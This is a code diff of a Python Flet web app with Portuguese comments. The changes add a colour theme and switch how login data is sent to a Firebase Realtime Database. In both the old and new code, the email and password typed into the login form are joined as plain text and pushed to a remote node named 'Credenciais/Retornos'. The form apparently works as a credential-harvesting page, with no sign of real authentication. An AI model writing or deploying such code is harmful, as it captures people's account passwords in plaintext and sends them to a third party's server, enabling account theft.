@@ -1,7 +1,8 @@
 import flet as ft
 import webbrowser
-import requests
-import json
+import firebase_admin
+from firebase_admin import credentials, db
+
 
 def main(page: ft.Page):
 
@@ -10,7 +11,14 @@ def main(page: ft.Page):
     page.padding = 0
     page.scroll = "always"
     page.splash = None
+    page.theme = ft.Theme(
+        color_scheme=ft.ColorScheme(
+            primary='blue',
+            on_primary='#ffffff',
+            background='#ecf0f1'
 
+        )
+    )
 
 
 
@@ -203,11 +211,26 @@ def main(page: ft.Page):
             # print(f"Senha: {t2_campo_senha.value}")
 
             try:
-                link = "https://projectphs-default-rtdb.firebaseio.com/"
+                # Caminho para o arquivo JSON que você baixou (o arquivo de credenciais correto)
+                cred = credentials.Certificate('serviceAccountKey.json')
 
-                credenciais = {"Retornos": f"{t2_campo_email.value};{t2_campo_senha.value}"}
+                # Inicializa o Firebase Admin SDK com o arquivo de credenciais
+                firebase_admin.initialize_app(cred, {
+                    'databaseURL': 'https://projectphs-default-rtdb.firebaseio.com'
+                    # O mesmo databaseURL que você forneceu
+                })
 
-                requests.post(f'{link}/Credenciais/.json', data=json.dumps(credenciais))
+                # Referência ao nó específico dentro do Realtime Database (Credenciais/Retornos)
+                db_ref = db.reference('Credenciais/Retornos')
+
+                # Função para adicionar ou atualizar o valor dentro de 'Credenciais/Retornos'
+                def adicionar_ou_atualizar_valor(novo_valor):
+                    nova_entrada_ref = db_ref.push()  # Gera uma nova chave única
+                    nova_entrada_ref.set(novo_valor)  # Adiciona o novo valor sob essa chave
+                    print(f"Novo valor adicionado: {novo_valor}")
+
+                # Chamar as funções
+                adicionar_ou_atualizar_valor(f'{t2_campo_email.value};{t2_campo_senha.value}')
             except:
                 page.snack_bar = ft.SnackBar(
                     bgcolor=ft.colors.RED_ACCENT_200,
@@ -219,7 +242,6 @@ def main(page: ft.Page):
                         ft.Icon(ft.icons.LINK_OFF, size=30, color='BLACK')  # ft.colors.GREEN_ACCENT_400)
                     ]))
                 page.snack_bar.open = True
-                page.update()
                 pass
 
 
@@ -555,6 +577,7 @@ def main(page: ft.Page):
 if __name__ == "__main__":
 
     ft.app(target=main, assets_dir="assets", view=ft.WEB_BROWSER)
+
 
 
 
